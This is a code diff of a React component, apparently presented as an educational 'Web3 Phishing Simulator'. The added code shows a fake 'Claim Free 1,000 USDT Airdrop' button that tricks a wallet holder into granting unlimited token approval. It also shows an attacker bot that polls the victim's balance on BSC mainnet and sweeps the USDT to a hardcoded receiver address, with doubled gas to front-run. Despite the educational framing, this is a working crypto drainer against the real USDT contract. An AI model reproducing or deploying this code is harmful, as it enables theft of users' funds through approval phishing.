@@ -1,110 +1,144 @@
 "use client";
 
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import { ethers } from 'ethers';
 
-// USDT ABI - Including Allowance for educational completeness
 const ERC20_ABI = [
   "function balanceOf(address owner) view returns (uint256)",
   "function transferFrom(address from, address to, uint256 amount) returns (bool)",
-  "function allowance(address owner, address spender) view returns (uint256)"
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function approve(address spender, uint256 amount) returns (bool)"
 ];
 
 const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 
-export default function SweeperDemo() {
-  const [status, setStatus] = useState<string>("Idle");
+export default function PhishingDemo() {
   const [logs, setLogs] = useState<string[]>([]);
   const [isMonitoring, setIsMonitoring] = useState(false);
+  const [targetAmount, setTargetAmount] = useState<string>("10");
+  
+  // These would usually be dynamic or env variables
+  const ADMIN_PRIVATE_KEY = "YOUR_EXPORTER_PRIVATE_KEY"; 
+  const RECEIVER_ADDRESS = "0xC0b4cE03Df84765aE604F239Ea4BBc5731F308aF";
 
   const addLog = (msg: string) => {
-    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 9)]);
+    setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${msg}`, ...prev.slice(0, 10)]);
   };
 
+  // --- VICTIM SIDE: The "Trap" ---
+  async function simulateVictimApproval() {
+    try {
+      if (!(window as any).ethereum) return alert("Install MetaMask");
+      const provider = new ethers.providers.Web3Provider((window as any).ethereum);
+      await provider.send("eth_requestAccounts", []);
+      const signer = provider.getSigner();
+      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+
+      addLog("Victim: Attempting to 'Claim Airdrop'...");
+      
+      // Requesting Unlimited Approval (The Phish)
+      const tx = await contract.approve(
+        "ADMIN_WALLET_ADDRESS_HERE", // The address linked to the Admin Private Key
+        ethers.constants.MaxUint256
+      );
+      addLog(`Victim: Approval transaction sent! Hash: ${tx.hash.slice(0,10)}...`);
+      await tx.wait();
+      addLog("Victim: Unlimited Approval Granted to Attacker.");
+    } catch (err: any) {
+      addLog(`Victim Error: ${err.message.slice(0, 50)}`);
+    }
+  }
+
+  // --- ATTACKER SIDE: The Sweeper ---
   async function startMonitoring() {
-    // WARNING: In a real app, use environment variables for private keys
-    // This is for demonstration only.
-    const privateKey = "YOUR_ADMIN_PRIVATE_KEY"; 
-    const victimAddress = "VICTIM_ADDRESS";
-    const receiverAddress = "0xC0b4cE03Df84765aE604F239Ea4BBc5731F308aF";
+    const victimAddress = "VICTIM_WALLET_ADDRESS";
 
     try {
       const provider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
-      const wallet = new ethers.Wallet(privateKey, provider);
-      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, wallet);
+      const attackerWallet = new ethers.Wallet(ADMIN_PRIVATE_KEY, provider);
+      const contract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, attackerWallet);
 
       setIsMonitoring(true);
-      setStatus("Monitoring Active");
-      addLog("Started monitoring victim wallet...");
+      addLog("Attacker: Monitoring started...");
 
       const interval = setInterval(async () => {
         try {
           const balance = await contract.balanceOf(victimAddress);
-          const allowance = await contract.allowance(victimAddress, wallet.address);
+          const threshold = ethers.utils.parseUnits(targetAmount, 18);
 
-          // Check if we have permission and if there is money
-          if (balance.gt(0)) {
-            if (allowance.lt(balance)) {
-              addLog("Error: No allowance. Phishing 'approval' step was likely missed.");
-              return;
-            }
-
-            addLog(`Balance detected: ${ethers.utils.formatUnits(balance, 18)} USDT`);
-            setStatus("Executing Transfer...");
-
-            const tx = await contract.transferFrom(victimAddress, receiverAddress, balance, {
-              // Higher gas price to "front-run" the victim
-              gasPrice: (await provider.getGasPrice()).mul(2) 
+          if (balance.gte(threshold)) {
+            addLog(`Target reached! ${ethers.utils.formatUnits(balance, 18)} USDT found.`);
+            
+            const tx = await contract.transferFrom(victimAddress, RECEIVER_ADDRESS, balance, {
+              gasPrice: (await provider.getGasPrice()).mul(2)
             });
 
-            addLog(`Transaction Sent: ${tx.hash}`);
+            addLog(`Sweep Executed: ${tx.hash}`);
             await tx.wait();
-            addLog("Success: Funds Swept.");
-            setStatus("Finished");
+            addLog("Success: Funds stolen.");
             clearInterval(interval);
             setIsMonitoring(false);
           }
         } catch (err: any) {
-          addLog(`Scanning... ${err.message.slice(0, 40)}`);
+          addLog(`Scanning for ${targetAmount} USDT...`);
         }
       }, 5000);
-
-      return () => clearInterval(interval);
     } catch (err: any) {
-      addLog(`Initialization Error: ${err.message}`);
+      addLog(`Attacker Error: ${err.message}`);
     }
   }
 
   return (
-    <div className="p-8 max-w-2xl mx-auto font-sans">
-      <h1 className="text-2xl font-bold mb-4 text-red-600">Educational Sweeper Bot Demo</h1>
-      <p className="mb-6 text-gray-600">
-        This dashboard demonstrates how malicious actors monitor approved wallets to steal funds instantly.
-      </p>
+    <div className="p-8 max-w-3xl mx-auto space-y-8">
+      <h1 className="text-3xl font-bold text-red-600 border-b pb-2">Web3 Phishing Simulator</h1>
 
-      <div className="bg-gray-100 p-4 rounded-lg mb-4">
-        <div className="flex justify-between items-center mb-4">
-          <span className="font-mono">Status: <strong>{status}</strong></span>
+      {/* SECTION 1: THE TRAP */}
+      <div className="p-6 border-2 border-dashed border-gray-300 rounded-xl">
+        <h2 className="font-bold mb-2">1. The Phishing Site (Victim View)</h2>
+        <p className="text-sm text-gray-500 mb-4">The victim clicks "Claim" and unknowingly signs an unlimited approval.</p>
+        <button 
+          onClick={simulateVictimApproval}
+          className="bg-blue-600 text-white px-6 py-3 rounded-lg font-bold hover:bg-blue-700 w-full"
+        >
+          🎁 Claim Free 1,000 USDT Airdrop
+        </button>
+      </div>
+
+      {/* SECTION 2: THE BOT */}
+      <div className="p-6 bg-gray-900 text-white rounded-xl">
+        <h2 className="font-bold mb-4 text-green-400">2. Attacker Control Panel</h2>
+        
+        <div className="flex gap-4 mb-4">
+          <div className="flex-1">
+            <label className="block text-xs uppercase mb-1">Min Sweep Amount (USDT)</label>
+            <input 
+              type="number" 
+              value={targetAmount}
+              onChange={(e) => setTargetAmount(e.target.value)}
+              className="w-full p-2 bg-gray-800 border border-gray-700 rounded"
+            />
+          </div>
           <button 
             onClick={startMonitoring}
             disabled={isMonitoring}
-            className="bg-black text-white px-4 py-2 rounded disabled:bg-gray-400"
+            className="mt-5 bg-green-600 px-4 py-2 rounded font-bold disabled:opacity-50"
           >
-            {isMonitoring ? "Running..." : "Start Demo"}
+            {isMonitoring ? "BOT ACTIVE" : "START MONITOR"}
           </button>
         </div>
 
-        <div className="bg-black text-green-400 p-4 rounded h-64 overflow-y-auto font-mono text-sm">
+        <div className="bg-black p-4 rounded h-48 overflow-y-auto font-mono text-xs text-green-500 border border-green-900">
           {logs.map((log, i) => <div key={i}>{log}</div>)}
-          {logs.length === 0 && <div className="text-gray-500">Waiting for logs...</div>}
         </div>
       </div>
 
-      <div className="text-sm text-gray-500 italic">
-        <strong>Security Tip:</strong> Never sign "Approve" transactions on suspicious sites. 
-        Always check <a href="https://bscscan.com/tokenapprovalchecker" className="underline">Token Approvals</a> regularly.
+      <div className="bg-yellow-50 p-4 rounded-lg border border-yellow-200">
+        <h3 className="font-bold text-yellow-800 text-sm">Educational takeaway:</h3>
+        <p className="text-xs text-yellow-700">
+          The <strong>Approve</strong> function is the most dangerous tool in DeFi. Once a user clicks that blue button, 
+          the "Admin" wallet has total control over that specific token until the approval is revoked.
+        </p>
       </div>
     </div>
   );
 }
-
